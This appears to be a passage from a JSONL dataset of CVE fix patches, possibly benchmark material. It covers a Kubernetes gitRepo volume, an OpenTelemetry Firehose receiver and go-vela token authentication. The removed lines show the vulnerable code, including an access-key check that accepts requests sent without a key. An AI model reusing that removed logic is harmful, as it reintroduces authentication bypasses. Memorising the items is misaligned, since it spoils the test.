b.opts)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tif err := wrapped.SetUpAt(dir, mounterArgs); err != nil {\n-\t\treturn err\n-\t}\n-\n-\targs := []string{\"clone\", \"--\", b.source}\n-\n-\tif len(b.target) != 0 {\n-\t\targs = append(args, b.target)\n-\t}\n-\tif output, err := b.execCommand(\"git\", args, dir); err != nil {\n-\t\treturn fmt.Errorf(\"failed to exec 'git %s': %s: %v\",\n-\t\t\tstrings.Join(args, \" \"), output, err)\n-\t}\n-\n-\tfiles, err := ioutil.ReadDir(dir)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tif len(b.revision) == 0 {\n-\t\t// Done!\n-\t\tvolumeutil.SetReady(b.getMetaDir())\n-\t\treturn nil\n-\t}\n-\n-\tvar subdir string\n-\n-\tswitch {\n-\tcase len(b.target) != 0 && filepath.Clean(b.target) == \".\":\n-\t\t// if target dir is '.', use the current dir\n-\t\tsubdir = filepath.Join(dir)\n-\tcase len(files) == 1:\n-\t\t// if target is not '.', use the generated folder\n-\t\tsubdir = filepath.Join(dir, files[0].Name())\n-\tdefault:\n-\t\t// if target is not '.', but generated many files, it's wrong\n-\t\treturn fmt.Errorf(\"unexpected directory contents: %v\", files)\n-\t}\n-\n-\tif output, err := b.execCommand(\"git\", []string{\"checkout\", b.revision}, subdir); err != nil {\n-\t\treturn fmt.Errorf(\"failed to exec 'git checkout %s': %s: %v\", b.revision, output, err)\n-\t}\n-\tif output, err := b.execCommand(\"git\", []string{\"reset\", \"--hard\"}, subdir); err != nil {\n-\t\treturn fmt.Errorf(\"failed to exec 'git reset --hard': %s: %v\", output, err)\n-\t}\n-\n-\tvolume.SetVolumeOwnership(b, dir, mounterArgs.FsGroup, nil /*fsGroupChangePolicy*/, volumeutil.FSGroupCompleteHook(b.plugin, nil))\n-\n-\tvolumeutil.SetReady(b.getMetaDir())\n-\treturn nil\n+        if volumeutil.IsReady(b.getMetaDir()) {\n+                return nil\n+        }\n+\n+        // Wrap EmptyDir, let it do the setup.\n+        wrapped, err := b.plugin.host.NewWrapperMounter(b.volName, wrappedVolumeSpec(), &b.pod, b.opts)\n+        if err != nil {\n+                return err\n+        }\n+        if err := wrapped.SetUpAt(dir, mounterArgs); err != nil {\n+                return err\n+        }\n+\n+        args := []string{\"clone\", \"--\", b.source}\n+\n+        if len(b.target) != 0 {\n+                args = append(args, b.target)\n+        }\n+        if output, err := b.execCommand(\"git\", args, dir); err != nil {\n+                return fmt.Errorf(\"failed to exec 'git %s': %s: %v\",\n+                        strings.Join(args, \" \"), output, err)\n+        }\n+\n+        files, err := ioutil.ReadDir(dir)\n+        if err != nil {\n+                return err\n+        }\n+\n+        if len(b.revision) == 0 {\n+                // Done!\n+                volumeutil.SetReady(b.getMetaDir())\n+                return nil\n+        }\n+\n+        var subdir string\n+\n+        switch {\n+        case len(b.target) != 0 && filepath.Clean(b.target) == \".\":\n+                // if target dir is '.', use the current dir\n+                subdir = filepath.Join(dir)\n+        case len(files) == 1:\n+                // if target is not '.', use the generated folder\n+                subdir = filepath.Join(dir, files[0].Name())\n+        default:\n+                // if target is not '.', but generated many files, it's wrong\n+                return fmt.Errorf(\"unexpected directory contents: %v\", files)\n+        }\n+\n+        if output, err := b.execCommand(\"git\", []string{\"checkout\", b.revision}, subdir); err != nil {\n+                return fmt.Errorf(\"failed to exec 'git checkout %s': %s: %v\", b.revision, output, err)\n+        }\n+        if output, err := b.execCommand(\"git\", []string{\"reset\", \"--hard\"}, subdir); err != nil {\n+                return fmt.Errorf(\"failed to exec 'git reset --hard': %s: %v\", output, err)\n+        }\n+\n+        volume.SetVolumeOwnership(b, dir, mounterArgs.FsGroup, nil /*fsGroupChangePolicy*/, volumeutil.FSGroupCompleteHook(b.plugin, nil))\n+\n+        volumeutil.SetReady(b.getMetaDir())\n+        return nil\n }\n \n func (b *gitRepoVolumeMounter) getMetaDir() string {\n-\treturn filepath.Join(b.plugin.host.GetPodPluginDir(b.podUID, utilstrings.EscapeQualifiedName(gitRepoPluginName)), b.volName)\n+        return filepath.Join(b.plugin.host.GetPodPluginDir(b.podUID, utilstrings.EscapeQualifiedName(gitRepoPluginName)), b.volName)\n }\n \n func (b *gitRepoVolumeMounter) execCommand(command string, args []string, dir string) ([]byte, error) {\n-\tcmd := b.exec.Command(command, args...)\n-\tcmd.SetDir(dir)\n-\treturn cmd.CombinedOutput()\n+        cmd := b.exec.Command(command, args...)\n+        cmd.SetDir(dir)\n+        return cmd.CombinedOutput()\n }\n \n func validateVolume(src *v1.GitRepoVolumeSource) error {\n-\tif err := validateNonFlagArgument(src.Repository, \"repository\"); err != nil {\n-\t\treturn err\n-\t}\n-\tif err := validateNonFlagArgument(src.Revision, \"revision\"); err != nil {\n-\t\treturn err\n-\t}\n-\tif err := validateNonFlagArgument(src.Directory, \"directory\"); err != nil {\n-\t\treturn err\n-\t}\n-\treturn nil\n+        if err := validateNonFlagArgument(src.Repository, \"repository\"); err != nil {\n+                return err\n+        }\n+        if err := validateNonFlagArgument(src.Revision, \"revision\"); err != nil {\n+                return err\n+        }\n+        if err := validateNonFlagArgument(src.Directory, \"directory\"); err != nil {\n+                return err\n+        }\n+if err := volumeutil.ValidatePathNoBacksteps(src.Directory); err != nil {\n+return fmt.Errorf(\"invalid git repo directory: %v\", err)\n+}\n+        return nil\n }\n \n // gitRepoVolumeUnmounter cleans git repo volumes.\n type gitRepoVolumeUnmounter struct {\n-\t*gitRepoVolume\n+        *gitRepoVolume\n }\n \n var _ volume.Unmounter = &gitRepoVolumeUnmounter{}\n \n // TearDown simply deletes everything in the directory.\n func (c *gitRepoVolumeUnmounter) TearDown() error {\n-\treturn c.TearDownAt(c.GetPath())\n+        return c.TearDownAt(c.GetPath())\n }\n \n // TearDownAt simply deletes everything in the directory.\n func (c *gitRepoVolumeUnmounter) TearDownAt(dir string) error {\n-\treturn volumeutil.UnmountViaEmptyDir(dir, c.plugin.host, c.volName, wrappedVolumeSpec(), c.podUID)\n+        return volumeutil.UnmountViaEmptyDir(dir, c.plugin.host, c.volName, wrappedVolumeSpec(), c.podUID)\n }\n \n func getVolumeSource(spec *volume.Spec) (*v1.GitRepoVolumeSource, bool) {\n-\tvar readOnly bool\n-\tvar volumeSource *v1.GitRepoVolumeSource\n+        var readOnly bool\n+        var volumeSource *v1.GitRepoVolumeSource\n \n-\tif spec.Volume != nil && spec.Volume.GitRepo != nil {\n-\t\tvolumeSource = spec.Volume.GitRepo\n-\t\treadOnly = spec.ReadOnly\n-\t}\n+        if spec.Volume != nil && spec.Volume.GitRepo != nil {\n+                volumeSource = spec.Volume.GitRepo\n+                readOnly = spec.ReadOnly\n+        }\n \n-\treturn volumeSource, readOnly\n+        return volumeSource, readOnly\n }\n \n func validateNonFlagArgument(arg, argName string) error {\n-\tif len(arg) > 0 && arg[0] == '-' {\n-\t\treturn fmt.Errorf(\"%q is an invalid value for %s\", arg, argName)\n-\t}\n-\treturn nil\n+        if len(arg) > 0 && arg[0] == '-' {\n+                return fmt.Errorf(\"%q is an invalid value for %s\", arg, argName)\n+        }\n+        return nil\n }\n"}
{"cve":"CVE-2024-45043:0708", "fix_patch": "diff --git a/receiver/awsfirehosereceiver/receiver.go b/receiver/awsfirehosereceiver/receiver.go\nindex 6211f61221..8d955574e3 100644\n--- a/receiver/awsfirehosereceiver/receiver.go\n+++ b/receiver/awsfirehosereceiver/receiver.go\n@@ -4,101 +4,101 @@\n package awsfirehosereceiver // import \"github.com/open-telemetry/opentelemetry-collector-contrib/receiver/awsfirehosereceiver\"\n \n import (\n-\t\"context\"\n-\t\"encoding/base64\"\n-\t\"encoding/json\"\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"io\"\n-\t\"net\"\n-\t\"net/http\"\n-\t\"sync\"\n-\t\"time\"\n-\n-\t\"go.opentelemetry.io/collector/component\"\n-\t\"go.opentelemetry.io/collector/component/componentstatus\"\n-\t\"go.opentelemetry.io/collector/receiver\"\n-\t\"go.uber.org/zap\"\n+        \"context\"\n+        \"encoding/base64\"\n+        \"encoding/json\"\n+        \"errors\"\n+        \"fmt\"\n+        \"io\"\n+        \"net\"\n+        \"net/http\"\n+        \"sync\"\n+        \"time\"\n+\n+        \"go.opentelemetry.io/collector/component\"\n+        \"go.opentelemetry.io/collector/component/componentstatus\"\n+        \"go.opentelemetry.io/collector/receiver\"\n+        \"go.uber.org/zap\"\n )\n \n const (\n-\theaderFirehoseRequestID        = \"X-Amz-Firehose-Request-Id\"\n-\theaderFirehoseAccessKey        = \"X-Amz-Firehose-Access-Key\"\n-\theaderFirehoseCommonAttributes = \"X-Amz-Firehose-Common-Attributes\"\n-\theaderContentType              = \"Content-Type\"\n-\theaderContentLength            = \"Content-Length\"\n+        headerFirehoseRequestID        = \"X-Amz-Firehose-Request-Id\"\n+        headerFirehoseAccessKey        = \"X-Amz-Firehose-Access-Key\"\n+        headerFirehoseCommonAttributes = \"X-Amz-Firehose-Common-Attributes\"\n+        headerContentType              = \"Content-Type\"\n+        headerContentLength            = \"Content-Length\"\n )\n \n var (\n-\terrMissingHost              = errors.New(\"nil host\")\n-\terrInvalidAccessKey         = errors.New(\"invalid firehose access key\")\n-\terrInHeaderMissingRequestID = errors.New(\"missing request id in header\")\n-\terrInBodyMissingRequestID   = errors.New(\"missing request id in body\")\n-\terrInBodyDiffRequestID      = errors.New(\"different request id in body\")\n+        errMissingHost              = errors.New(\"nil host\")\n+        errInvalidAccessKey         = errors.New(\"invalid firehose access key\")\n+        errInHeaderMissingRequestID = errors.New(\"missing request id in header\")\n+        errInBodyMissingRequestID   = errors.New(\"missing request id in body\")\n+        errInBodyDiffRequestID      = errors.New(\"different request id in body\")\n )\n \n // The firehoseConsumer is responsible for using the unmarshaler and the consumer.\n type firehoseConsumer interface {\n-\t// Consume unmarshalls and consumes the records.\n-\tConsume(ctx context.Context, records [][]byte, commonAttributes map[string]string) (int, error)\n+        // Consume unmarshalls and consumes the records.\n+        Consume(ctx context.Context, records [][]byte, commonAttributes map[string]string) (int, error)\n }\n \n // firehoseReceiver\n type firehoseReceiver struct {\n-\t// settings is the base receiver settings.\n-\tsettings receiver.Settings\n-\t// config is the configuration for the receiver.\n-\tconfig *Config\n-\t// server is the HTTP/HTTPS server set up to listen\n-\t// for requests.\n-\tserver *http.Server\n-\t// shutdownWG is the WaitGroup that is used to wait until\n-\t// the server shutdown has completed.\n-\tshutdownWG sync.WaitGroup\n-\t// consumer is the firehoseConsumer to use to process/send\n-\t// the records in each request.\n-\tconsumer firehoseConsumer\n+        // settings is the base receiver settings.\n+        settings receiver.Settings\n+        // config is the configuration for the receiver.\n+        config *Config\n+        // server is the HTTP/HTTPS server set up to listen\n+        // for requests.\n+        server *http.Server\n+        // shutdownWG is the WaitGroup that is used to wait until\n+        // the server shutdown has completed.\n+        shutdownWG sync.WaitGroup\n+        // consumer is the firehoseConsumer to use to process/send\n+        // the records in each request.\n+        consumer firehoseConsumer\n }\n \n // The firehoseRequest is the format of the received request body.\n type firehoseRequest struct {\n-\t// RequestID is a GUID that should be the same value as\n-\t// the one in the header.\n-\tRequestID string `json:\"requestId\"`\n-\t// Timestamp is the milliseconds since epoch for when the\n-\t// request was generated.\n-\tTimestamp int64 `json:\"timestamp\"`\n-\t// Records contains the data.\n-\tRecords []firehoseRecord `json:\"records\"`\n+        // RequestID is a GUID that should be the same value as\n+        // the one in the header.\n+        RequestID string `json:\"requestId\"`\n+        // Timestamp is the milliseconds since epoch for when the\n+        // request was generated.\n+        Timestamp int64 `json:\"timestamp\"`\n+        // Records contains the data.\n+        Records []firehoseRecord `json:\"records\"`\n }\n \n // The firehoseRecord is an individual record within the firehoseRequest.\n type firehoseRecord struct {\n-\t// Data is a base64 encoded string. Can be empty.\n-\tData string `json:\"data\"`\n+        // Data is a base64 encoded string. Can be empty.\n+        Data string `json:\"data\"`\n }\n \n // The firehoseResponse is the expected body for the response back to\n // the delivery stream.\n type firehoseResponse struct {\n-\t// RequestID is the same GUID that was received in\n-\t// the request.\n-\tRequestID string `json:\"requestId\"`\n-\t// Timestamp is the milliseconds since epoch for when the\n-\t// request finished being processed.\n-\tTimestamp int64 `json:\"timestamp\"`\n-\t// ErrorMessage is the error to report. Empty if request\n-\t// was successfully processed.\n-\tErrorMessage string `json:\"errorMessage,omitempty\"`\n+        // RequestID is the same GUID that was received in\n+        // the request.\n+        RequestID string `json:\"requestId\"`\n+        // Timestamp is the milliseconds since epoch for when the\n+        // request finished being processed.\n+        Timestamp int64 `json:\"timestamp\"`\n+        // ErrorMessage is the error to report. Empty if request\n+        // was successfully processed.\n+        ErrorMessage string `json:\"errorMessage,omitempty\"`\n }\n \n // The firehoseCommonAttributes is the format for the common attributes\n // found in the header of requests.\n type firehoseCommonAttributes struct {\n-\t// CommonAttributes can be set when creating the delivery stream.\n-\t// These will be passed to the firehoseConsumer, which should\n-\t// attach the attributes.\n-\tCommonAttributes map[string]string `json:\"commonAttributes\"`\n+        // CommonAttributes can be set when creating the delivery stream.\n+        // These will be passed to the firehoseConsumer, which should\n+        // attach the attributes.\n+        CommonAttributes map[string]string `json:\"commonAttributes\"`\n }\n \n var _ receiver.Metrics = (*firehoseReceiver)(nil)\n@@ -107,180 +107,183 @@ var _ http.Handler = (*firehoseReceiver)(nil)\n // Start spins up the receiver's HTTP server and makes the receiver start\n // its processing.\n func (fmr *firehoseReceiver) Start(ctx context.Context, host component.Host) error {\n-\tif host == nil {\n-\t\treturn errMissingHost\n-\t}\n-\n-\tvar err error\n-\tfmr.server, err = fmr.config.ServerConfig.ToServer(ctx, host, fmr.settings.TelemetrySettings, fmr)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tvar listener net.Listener\n-\tlistener, err = fmr.config.ServerConfig.ToListener(ctx)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tfmr.shutdownWG.Add(1)\n-\tgo func() {\n-\t\tdefer fmr.shutdownWG.Done()\n-\n-\t\tif errHTTP := fmr.server.Serve(listener); errHTTP != nil && !errors.Is(errHTTP, http.ErrServerClosed) {\n-\t\t\tcomponentstatus.ReportStatus(host, componentstatus.NewFatalErrorEvent(errHTTP))\n-\t\t}\n-\t}()\n-\n-\treturn nil\n+        if host == nil {\n+                return errMissingHost\n+        }\n+\n+        var err error\n+        fmr.server, err = fmr.config.ServerConfig.ToServer(ctx, host, fmr.settings.TelemetrySettings, fmr)\n+        if err != nil {\n+                return err\n+        }\n+\n+        var listener net.Listener\n+        listener, err = fmr.config.ServerConfig.ToListener(ctx)\n+        if err != nil {\n+                return err\n+        }\n+        fmr.shutdownWG.Add(1)\n+        go func() {\n+                defer fmr.shutdownWG.Done()\n+\n+                if errHTTP := fmr.server.Serve(listener); errHTTP != nil && !errors.Is(errHTTP, http.ErrServerClosed) {\n+                        componentstatus.ReportStatus(host, componentstatus.NewFatalErrorEvent(errHTTP))\n+                }\n+        }()\n+\n+        return nil\n }\n \n // Shutdown tells the receiver that should stop reception,\n // giving it a chance to perform any necessary clean-up and\n // shutting down its HTTP server.\n func (fmr *firehoseReceiver) Shutdown(context.Context) error {\n-\tif fmr.server == nil {\n-\t\treturn nil\n-\t}\n-\terr := fmr.server.Close()\n-\tfmr.shutdownWG.Wait()\n-\treturn err\n+        if fmr.server == nil {\n+                return nil\n+        }\n+        err := fmr.server.Close()\n+        fmr.shutdownWG.Wait()\n+        return err\n }\n \n // ServeHTTP receives Firehose requests, unmarshalls them, and sends them along to the firehoseConsumer,\n // which is responsible for unmarshalling the records and sending them to the next consumer.\n func (fmr *firehoseReceiver) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\trequestID := r.Header.Get(headerFirehoseRequestID)\n-\tif requestID == \"\" {\n-\t\tfmr.settings.Logger.Error(\n-\t\t\t\"Invalid Firehose request\",\n-\t\t\tzap.Error(errInHeaderMissingRequestID),\n-\t\t)\n-\t\tfmr.sendResponse(w, requestID, http.StatusBadRequest, errInHeaderMissingRequestID)\n-\t\treturn\n-\t}\n-\tfmr.settings.Logger.Debug(\"Processing Firehose request\", zap.String(\"RequestID\", requestID))\n-\n-\tif statusCode, err := fmr.validate(r); err != nil {\n-\t\tfmr.settings.Logger.Error(\n-\t\t\t\"Invalid Firehose request\",\n-\t\t\tzap.Error(err),\n-\t\t)\n-\t\tfmr.sendResponse(w, requestID, statusCode, err)\n-\t\treturn\n-\t}\n-\n-\tbody, err := fmr.getBody(r)\n-\tif err != nil {\n-\t\tfmr.sendResponse(w, requestID, http.StatusBadRequest, err)\n-\t\treturn\n-\t}\n-\n-\tvar fr firehoseRequest\n-\tif err = json.Unmarshal(body, &fr); err != nil {\n-\t\tfmr.sendResponse(w, requestID, http.StatusBadRequest, err)\n-\t\treturn\n-\t}\n-\n-\tif fr.RequestID == \"\" {\n-\t\tfmr.sendResponse(w, requestID, http.StatusBadRequest, errInBodyMissingRequestID)\n-\t\treturn\n-\t} else if fr.RequestID != requestID {\n-\t\tfmr.sendResponse(w, requestID, http.StatusBadRequest, errInBodyDiffRequestID)\n-\t\treturn\n-\t}\n-\n-\trecords := make([][]byte, 0, len(fr.Records))\n-\tfor index, record := range fr.Records {\n-\t\tif record.Data != \"\" {\n-\t\t\tvar decoded []byte\n-\t\t\tdecoded, err = base64.StdEncoding.DecodeString(record.Data)\n-\t\t\tif err != nil {\n-\t\t\t\tfmr.sendResponse(\n-\t\t\t\t\tw,\n-\t\t\t\t\trequestID,\n-\t\t\t\t\thttp.StatusBadRequest,\n-\t\t\t\t\tfmt.Errorf(\"unable to base64 decode the record at index %d: %w\", index, err),\n-\t\t\t\t)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\trecords = append(records, decoded)\n-\t\t}\n-\t}\n-\n-\tcommonAttributes, err := fmr.getCommonAttributes(r)\n-\tif err != nil {\n-\t\tfmr.settings.Logger.Error(\n-\t\t\t\"Unable to get common attributes from request header. Will not attach attributes.\",\n-\t\t\tzap.Error(err),\n-\t\t)\n-\t}\n-\n-\tstatusCode, err := fmr.consumer.Consume(ctx, records, commonAttributes)\n-\tif err != nil {\n-\t\tfmr.settings.Logger.Error(\n-\t\t\t\"Unable to consume records\",\n-\t\t\tzap.Error(err),\n-\t\t)\n-\t\tfmr.sendResponse(w, requestID, statusCode, err)\n-\t\treturn\n-\t}\n-\n-\tfmr.sendResponse(w, requestID, http.StatusOK, nil)\n+        ctx := r.Context()\n+\n+        requestID := r.Header.Get(headerFirehoseRequestID)\n+        if requestID == \"\" {\n+                fmr.settings.Logger.Error(\n+                        \"Invalid Firehose request\",\n+                        zap.Error(errInHeaderMissingRequestID),\n+                )\n+                fmr.sendResponse(w, requestID, http.StatusBadRequest, errInHeaderMissingRequestID)\n+                return\n+        }\n+        fmr.settings.Logger.Debug(\"Processing Firehose request\", zap.String(\"RequestID\", requestID))\n+\n+        if statusCode, err := fmr.validate(r); err != nil {\n+                fmr.settings.Logger.Error(\n+                        \"Invalid Firehose request\",\n+                        zap.Error(err),\n+                )\n+                fmr.sendResponse(w, requestID, statusCode, err)\n+                return\n+        }\n+\n+        body, err := fmr.getBody(r)\n+        if err != nil {\n+                fmr.sendResponse(w, requestID, http.StatusBadRequest, err)\n+                return\n+        }\n+\n+        var fr firehoseRequest\n+        if err = json.Unmarshal(body, &fr); err != nil {\n+                fmr.sendResponse(w, requestID, http.StatusBadRequest, err)\n+                return\n+        }\n+\n+        if fr.RequestID == \"\" {\n+                fmr.sendResponse(w, requestID, http.StatusBadRequest, errInBodyMissingRequestID)\n+                return\n+        } else if fr.RequestID != requestID {\n+                fmr.sendResponse(w, requestID, http.StatusBadRequest, errInBodyDiffRequestID)\n+                return\n+        }\n+\n+        records := make([][]byte, 0, len(fr.Records))\n+        for index, record := range fr.Records {\n+                if record.Data != \"\" {\n+                        var decoded []byte\n+                        decoded, err = base64.StdEncoding.DecodeString(record.Data)\n+                        if err != nil {\n+                                fmr.sendResponse(\n+                                        w,\n+                                        requestID,\n+                                        http.StatusBadRequest,\n+                                        fmt.Errorf(\"unable to base64 decode the record at index %d: %w\", index, err),\n+                                )\n+                                return\n+                        }\n+                        records = append(records, decoded)\n+                }\n+        }\n+\n+        commonAttributes, err := fmr.getCommonAttributes(r)\n+        if err != nil {\n+                fmr.settings.Logger.Error(\n+                        \"Unable to get common attributes from request header. Will not attach attributes.\",\n+                        zap.Error(err),\n+                )\n+        }\n+\n+        statusCode, err := fmr.consumer.Consume(ctx, records, commonAttributes)\n+        if err != nil {\n+                fmr.settings.Logger.Error(\n+                        \"Unable to consume records\",\n+                        zap.Error(err),\n+                )\n+                fmr.sendResponse(w, requestID, statusCode, err)\n+                return\n+        }\n+\n+        fmr.sendResponse(w, requestID, http.StatusOK, nil)\n }\n \n // validate checks the Firehose access key in the header against\n // the one passed into the Config\n func (fmr *firehoseReceiver) validate(r *http.Request) (int, error) {\n-\tif accessKey := r.Header.Get(headerFirehoseAccessKey); accessKey != \"\" && accessKey != string(fmr.config.AccessKey) {\n-\t\treturn http.StatusUnauthorized, errInvalidAccessKey\n-\t}\n-\treturn http.StatusAccepted, nil\n+if fmr.config.AccessKey == \"\" {\n+return http.StatusAccepted, nil\n+}\n+if r.Header.Get(headerFirehoseAccessKey) != string(fmr.config.AccessKey) {\n+return http.StatusUnauthorized, errInvalidAccessKey\n+}\n+return http.StatusAccepted, nil\n }\n \n // getBody reads the body from the request as a slice of bytes.\n func (fmr *firehoseReceiver) getBody(r *http.Request) ([]byte, error) {\n-\tbody, err := io.ReadAll(r.Body)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\terr = r.Body.Close()\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\treturn body, nil\n+        body, err := io.ReadAll(r.Body)\n+        if err != nil {\n+                return nil, err\n+        }\n+        err = r.Body.Close()\n+        if err != nil {\n+                return nil, err\n+        }\n+        return body, nil\n }\n \n // getCommonAttributes unmarshalls the common attributes from the request header\n func (fmr *firehoseReceiver) getCommonAttributes(r *http.Request) (map[string]string, error) {\n-\tattributes := make(map[string]string)\n-\tif commonAttributes := r.Header.Get(headerFirehoseCommonAttributes); commonAttributes != \"\" {\n-\t\tvar fca firehoseCommonAttributes\n-\t\tif err := json.Unmarshal([]byte(commonAttributes), &fca); err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\tattributes = fca.CommonAttributes\n-\t}\n-\treturn attributes, nil\n+        attributes := make(map[string]string)\n+        if commonAttributes := r.Header.Get(headerFirehoseCommonAttributes); commonAttributes != \"\" {\n+                var fca firehoseCommonAttributes\n+                if err := json.Unmarshal([]byte(commonAttributes), &fca); err != nil {\n+                        return nil, err\n+                }\n+                attributes = fca.CommonAttributes\n+        }\n+        return attributes, nil\n }\n \n // sendResponse writes a response to Firehose in the expected format.\n func (fmr *firehoseReceiver) sendResponse(w http.ResponseWriter, requestID string, statusCode int, err error) {\n-\tvar errorMessage string\n-\tif err != nil {\n-\t\terrorMessage = err.Error()\n-\t}\n-\tbody := firehoseResponse{\n-\t\tRequestID:    requestID,\n-\t\tTimestamp:    time.Now().UnixMilli(),\n-\t\tErrorMessage: errorMessage,\n-\t}\n-\tpayload, _ := json.Marshal(body)\n-\tw.Header().Set(headerContentType, \"application/json\")\n-\tw.Header().Set(headerContentLength, fmt.Sprintf(\"%d\", len(payload)))\n-\tw.WriteHeader(statusCode)\n-\tif _, err = w.Write(payload); err != nil {\n-\t\tfmr.settings.Logger.Error(\"Failed to send response\", zap.Error(err))\n-\t}\n+        var errorMessage string\n+        if err != nil {\n+                errorMessage = err.Error()\n+        }\n+        body := firehoseResponse{\n+                RequestID:    requestID,\n+                Timestamp:    time.Now().UnixMilli(),\n+                ErrorMessage: errorMessage,\n+        }\n+        payload, _ := json.Marshal(body)\n+        w.Header().Set(headerContentType, \"application/json\")\n+        w.Header().Set(headerContentLength, fmt.Sprintf(\"%d\", len(payload)))\n+        w.WriteHeader(statusCode)\n+        if _, err = w.Write(payload); err != nil {\n+                fmr.settings.Logger.Error(\"Failed to send response\", zap.Error(err))\n+        }\n }\n"}
{"cve":"CVE-2021-21432:0708", "fix_patch": "diff --git a/source/github/authentication.go b/source/github/authentication.go\nindex 6d964e3a..122a9670 100644\n--- a/source/github/authentication.go\n+++ b/source/github/authentication.go\n@@ -5,56 +5,56 @@\n package github\n \n import (\n-\t\"context\"\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"net/http\"\n+        \"context\"\n+        \"errors\"\n+        \"fmt\"\n+        \"net/http\"\n \n-\t\"github.com/go-vela/server/random\"\n+        \"github.com/go-vela/server/random\"\n \n-\t\"github.com/go-vela/types/library\"\n+        \"github.com/go-vela/types/library\"\n \n-\t\"github.com/sirupsen/logrus\"\n+        \"github.com/sirupsen/logrus\"\n )\n \n // Authorize uses the given access token to authorize the user.\n func (c *client) Authorize(token string) (string, error) {\n-\tlogrus.Trace(\"Authorizing user with token\")\n+        logrus.Trace(\"Authorizing user with token\")\n \n-\t// create GitHub OAuth client with user's token\n-\tclient := c.newClientToken(token)\n+        // create GitHub OAuth client with user's token\n+        client := c.newClientToken(token)\n \n-\t// send API call to capture the current user making the call\n-\tu, _, err := client.Users.Get(ctx, \"\")\n-\tif err != nil {\n-\t\treturn \"\", err\n-\t}\n+        // send API call to capture the current user making the call\n+        u, _, err := client.Users.Get(ctx, \"\")\n+        if err != nil {\n+                return \"\", err\n+        }\n \n-\treturn u.GetLogin(), nil\n+        return u.GetLogin(), nil\n }\n \n // Login begins the authentication workflow for the session.\n func (c *client) Login(w http.ResponseWriter, r *http.Request) (string, error) {\n-\tlogrus.Trace(\"Processing login request\")\n-\n-\t// generate a random string for creating the OAuth state\n-\t//\n-\t// nolint: gomnd // ignore magic number\n-\toAuthState, err := random.GenerateRandomString(32)\n-\tif err != nil {\n-\t\treturn \"\", err\n-\t}\n-\n-\t// pass through the redirect if it exists\n-\tredirect := r.FormValue(\"redirect_uri\")\n-\tif len(redirect) > 0 {\n-\t\tc.OConfig.RedirectURL = redirect\n-\t}\n-\n-\t// temporarily redirect request to Github to begin workflow\n-\thttp.Redirect(w, r, c.OConfig.AuthCodeURL(oAuthState), http.StatusTemporaryRedirect)\n-\n-\treturn oAuthState, nil\n+        logrus.Trace(\"Processing login request\")\n+\n+        // generate a random string for creating the OAuth state\n+        //\n+        // nolint: gomnd // ignore magic number\n+        oAuthState, err := random.GenerateRandomString(32)\n+        if err != nil {\n+                return \"\", err\n+        }\n+\n+        // pass through the redirect if it exists\n+        redirect := r.FormValue(\"redirect_uri\")\n+        if len(redirect) > 0 {\n+                c.OConfig.RedirectURL = redirect\n+        }\n+\n+        // temporarily redirect request to Github to begin workflow\n+        http.Redirect(w, r, c.OConfig.AuthCodeURL(oAuthState), http.StatusTemporaryRedirect)\n+\n+        return oAuthState, nil\n }\n \n // Authenticate completes the authentication workflow for the session\n@@ -62,61 +62,46 @@ func (c *client) Login(w http.ResponseWriter, r *http.Request) (string, error) {\n //\n // nolint: lll // ignore long line length due to variable names\n func (c *client) Authenticate(w http.ResponseWriter, r *http.Request, oAuthState string) (*library.User, error) {\n-\tlogrus.Trace(\"Authenticating user\")\n-\n-\t// get the OAuth code\n-\tcode := r.FormValue(\"code\")\n-\tif len(code) == 0 {\n-\t\treturn nil, nil\n-\t}\n-\n-\t// verify the OAuth state\n-\tstate := r.FormValue(\"state\")\n-\tif state != oAuthState {\n-\t\treturn nil, fmt.Errorf(\"unexpected oauth state: want %s but got %s\", oAuthState, state)\n-\t}\n-\n-\t// pass through the redirect if it exists\n-\tredirect := r.FormValue(\"redirect_uri\")\n-\tif len(redirect) > 0 {\n-\t\tc.OConfig.RedirectURL = redirect\n-\t}\n-\n-\t// exchange OAuth code for token\n-\ttoken, err := c.OConfig.Exchange(context.Background(), code)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\t// authorize the user for the token\n-\tu, err := c.Authorize(token.AccessToken)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\treturn &library.User{\n-\t\tName:  &u,\n-\t\tToken: &token.AccessToken,\n-\t}, nil\n+        logrus.Trace(\"Authenticating user\")\n+\n+        // get the OAuth code\n+        code := r.FormValue(\"code\")\n+        if len(code) == 0 {\n+                return nil, nil\n+        }\n+\n+        // verify the OAuth state\n+        state := r.FormValue(\"state\")\n+        if state != oAuthState {\n+                return nil, fmt.Errorf(\"unexpected oauth state: want %s but got %s\", oAuthState, state)\n+        }\n+\n+        // pass through the redirect if it exists\n+        redirect := r.FormValue(\"redirect_uri\")\n+        if len(redirect) > 0 {\n+                c.OConfig.RedirectURL = redirect\n+        }\n+\n+        // exchange OAuth code for token\n+        token, err := c.OConfig.Exchange(context.Background(), code)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        // authorize the user for the token\n+        u, err := c.Authorize(token.AccessToken)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        return &library.User{\n+                Name:  &u,\n+                Token: &token.AccessToken,\n+        }, nil\n }\n \n // AuthenticateToken completes the authentication workflow\n // for the session and returns the remote user details.\n func (c *client) AuthenticateToken(r *http.Request) (*library.User, error) {\n-\tlogrus.Trace(\"Authenticating user via token\")\n-\n-\ttoken := r.Header.Get(\"Token\")\n-\tif len(token) == 0 {\n-\t\treturn nil, errors.New(\"no token provided\")\n-\t}\n-\n-\tu, err := c.Authorize(token)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\treturn &library.User{\n-\t\tName:  &u,\n-\t\tToken: &token,\n-\t}, nil\n+return nil, errors.New(\"feature not supported\")\n }\n"}
